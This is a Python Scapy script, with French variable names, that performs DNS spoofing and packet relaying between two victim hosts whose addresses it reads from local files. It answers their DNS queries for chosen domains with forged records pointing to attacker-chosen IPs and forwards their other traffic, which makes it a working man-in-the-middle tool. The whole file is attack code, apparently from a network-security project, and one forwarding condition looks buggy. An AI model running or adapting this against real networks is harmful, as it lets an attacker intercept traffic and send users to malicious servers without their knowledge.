from scapy.all import *


fichier = open("Resources/informations.txt", "r")
contenu = fichier.read().split()
fichier.close()

ip_victime1 = contenu[0]
mac_victime1 = contenu[1]
ip_victime2 = contenu[2]
mac_victime2 = contenu[3]
ip = contenu[4]
mac = contenu[5]
iface = contenu[6]

fichier = open("Resources/dns_spoof.txt", "r")
dns_spoof = fichier.read().split("*")[1].split(";")
fichier.close()

for i in range(0,len(dns_spoof)):
    dns_spoof[i] = "".join(dns_spoof[i].split("\n")) + "."*(i%2 == 0)

def change_dst(packet):
    try:
        if packet.haslayer(DNSQR) and packet[Ether].dst == mac:
            for i in range(0, len(dns_spoof)):
                if i%2 == 0:
                    if  packet[DNSQR].qname.decode("utf-8") == dns_spoof[i] :
                        print(dns_spoof[i+1])
                        dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=0, arcount=0, ar=DNSRR(rrname=packet[DNS].qd.qname, type='A', ttl=600, rdata=dns_spoof[i+1]))
                        eth = Ether(src=mac, dst=packet[Ether].src)
                        udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                        ip_couche = IP(src=packet[IP].dst, dst=packet[IP].src)
                        response_packet = eth / ip_couche / udp / dns
                        sendp(response_packet, iface=iface, verbose=False)
                        return

        if packet[Ether].dst == mac and packet[IP].dst != ip:
            packet[Ether].dst = mac_victime1*((packet[IP].dst == ip_victime1) or packet[IP].src == ip_victime2) + mac_victime2*((packet[IP].dst == ip_victime2) or packet.src == ip_victime2)
            packet[Ether].src = mac
            sendp(packet, iface=iface, verbose=False)
    except IndexError:
        return


sniff(iface = iface, filter = "host "+ip_victime1+" or host "+ip_victime2, prn = change_dst)